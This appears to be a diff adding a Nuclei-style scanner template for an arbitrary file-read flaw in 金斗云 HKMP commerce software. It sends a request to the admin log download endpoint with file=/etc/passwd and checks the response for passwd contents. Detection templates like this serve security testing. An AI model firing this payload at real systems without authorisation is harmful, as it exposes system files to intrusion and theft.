@@ -1,0 +1,25 @@
+id: jindouyun-HKMP_download-File-reading
+
+info:
+  name: 金斗云 HKMP智慧商业软件 download 任意文件读取漏洞
+  author: unknown
+  severity: high
+  tags: File reading
+
+
+http:
+  - raw:
+      - |
+        GET /admin/log/download?file=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
+          - '/bin/bash'
+        condition: and
+      - type: status
+        status: 
+          - 200
